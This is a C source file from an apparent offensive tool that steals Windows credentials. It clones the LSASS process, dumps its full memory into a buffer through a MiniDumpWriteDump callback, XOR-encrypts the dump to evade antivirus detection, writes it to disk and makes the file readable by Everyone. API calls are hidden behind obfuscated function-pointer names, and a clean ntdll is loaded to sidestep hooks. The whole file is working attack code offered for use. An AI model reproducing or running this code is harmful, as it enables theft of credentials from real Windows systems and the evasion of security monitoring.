#include "defs.h"
#include "dump.h"
#include "logger.h"
#include "api.h"
#include "utils.h"

// ==================================
// Cloning LSASS
// ==================================

HANDLE CloneLsassProcess() {
    HANDLE hSnapshot = pCTH(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return NULL;

    PROCESSENTRY32W pe = { 0 };
    pe.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hLsass = NULL;
    if (pP32F(hSnapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
                hLsass = pOP(PROCESS_CREATE_PROCESS, FALSE, pe.th32ProcessID);
                break;
            }
        } while (pP32N(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    log_info("Found process: %ls (PID: %lu)", pe.szExeFile, pe.th32ProcessID);

    if (!hLsass) {
        log_error("Failed to open lsass.exe");
        return NULL;
    }

    HMODULE ntdll = LoadCleanDLL("ntdll.dll");
    if (!ntdll) return NULL;


    HANDLE hClone = NULL;

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    NTSTATUS status = pNTCPX(
        &hClone,
        PROCESS_ALL_ACCESS,
        &objAttr,
        hLsass,
        0,
        NULL,
        NULL,
        NULL,
        FALSE
    );

    CloseHandle(hLsass);

    if (status != 0) {
        log_error("pNTCPX failed : 0x % X", status);
        return NULL;
    }

    log_success("Successfully cloned process, handle: 0x%p", hClone);
    return hClone;
}

// ==================================
// Dumping LSASS in memory
// ==================================

// Xoring LSASS
LPVOID dumpBuffer = NULL;
DWORD dumpSize = 0;

BOOL InitializeDumpBuffer() {
    dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 200); // Dynamic allocation (200MB)
    if (dumpBuffer == NULL) {
        log_error("Failed to allocate memory for dump buffer");
        return FALSE;
    }
    return TRUE;
}

// Callback routine that we be called by the MiniDumpWriteDump function
BOOL CALLBACK DumpCallbackRoutine(PVOID CallbackParam, const PMINIDUMP_CALLBACK_INPUT CallbackInput, PMINIDUMP_CALLBACK_OUTPUT CallbackOutput) {
    LPVOID destination = 0;
    LPVOID source = 0;
    DWORD bufferSize = 0;
    switch (CallbackInput->CallbackType) {
    case IoStartCallback:
        CallbackOutput->Status = S_FALSE;
        log_info("Starting dump to memory buffer");
        break;
    case IoWriteAllCallback:
        // Buffer holding the current chunk of dump data
        source = CallbackInput->Io.Buffer;

        // Calculate the memory address we need to copy the chunk of dump data to based on the current dump data offset
        destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)CallbackInput->Io.Offset);

        // Size of the current chunk of dump data
        bufferSize = CallbackInput->Io.BufferBytes;

        // Copy the chunk data to the appropriate memory address of our allocated buffer
        RtlCopyMemory(destination, source, bufferSize);
        dumpSize += bufferSize; // Incremeant the total size of the dump with the current chunk size

        //printf("[+] Copied %i bytes to memory buffer\n", bufferSize);

        CallbackOutput->Status = S_OK;
        break;
    case IoFinishCallback:
        CallbackOutput->Status = S_OK;
        log_success("Copied %i bytes to memory buffer", dumpSize);
        break;
    }
    return TRUE;
}



BOOL DumpAndXorLsass(const char* outPath, const char* key, size_t key_len) {
    HANDLE hClone = CloneLsassProcess();
    if (!hClone) {
        log_error("Failed to clone.");
        return FALSE;
    }
    
    DWORD clonedPID = pGPID(hClone);
    if (!clonedPID) {
        log_error("Failed to GetProcessId.");
        return FALSE;
    }

    if (!InitializeDumpBuffer()) {
        log_error("Failed to InitializeDumpBuffer.");
        return FALSE; 
    }
    
    // Callback configuration
    MINIDUMP_CALLBACK_INFORMATION mci;
    mci.CallbackRoutine = DumpCallbackRoutine;
    mci.CallbackParam = (PVOID)key; // key passed as parameter
    
    // Dump
    BOOL dumped = pMDWD(
        hClone,
        clonedPID,
        NULL,
        MiniDumpWithFullMemory,
        NULL,
        NULL,
        &mci
    );
    
    if (!dumped) {
        log_error("Dump failed. Error: %lu", GetLastError());        
        HeapFree(GetProcessHeap(), 0, dumpBuffer);
        return FALSE;
    }

    // Xoring the buffer
    xor_buffer(dumpBuffer, dumpSize, key, key_len);

    // Create file on disk
    HANDLE dumpFile = pCFA(outPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (dumpFile == INVALID_HANDLE_VALUE) {
        log_error("Failed to create output file. Error: %lu", GetLastError());
        HeapFree(GetProcessHeap(), 0, dumpBuffer);
        return FALSE;
    }

    // Write buffer on file
    DWORD bytesWritten = 0;
    BOOL writeSuccess = WriteFile(dumpFile, dumpBuffer, dumpSize, &bytesWritten, NULL);
    CloseHandle(dumpFile);

    if (!writeSuccess || bytesWritten != dumpSize) {
        log_error("Failed to write XORed dump to file. Error: %lu", GetLastError());
        HeapFree(GetProcessHeap(), 0, dumpBuffer);
        return FALSE;
    }

    log_success("XOR'd dump written to %s successfully", outPath);
    
    HeapFree(GetProcessHeap(), 0, dumpBuffer);
    dumpBuffer = NULL;
    dumpSize = 0;

    return TRUE;
}

// ==================================
// Set read access for everyone
// ==================================

BOOL SetFileGenericReadAccess(const char* filePath) {
    EXPLICIT_ACCESS ea = { 0 };
    PACL pNewDACL = NULL;

    ea.grfAccessPermissions = GENERIC_READ;
    ea.grfAccessMode = SET_ACCESS;
    ea.grfInheritance = NO_INHERITANCE;
    ea.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
    ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea.Trustee.ptstrName = L"Everyone";

    DWORD dwRes = SetEntriesInAcl(1, &ea, NULL, &pNewDACL);
    if (dwRes != ERROR_SUCCESS) return FALSE;

    dwRes = SetNamedSecurityInfoA(
        (LPSTR)filePath,
        SE_FILE_OBJECT,
        DACL_SECURITY_INFORMATION,
        NULL, NULL, pNewDACL, NULL
    );

    if (pNewDACL)
        LocalFree(pNewDACL);

    return dwRes == ERROR_SUCCESS;
}

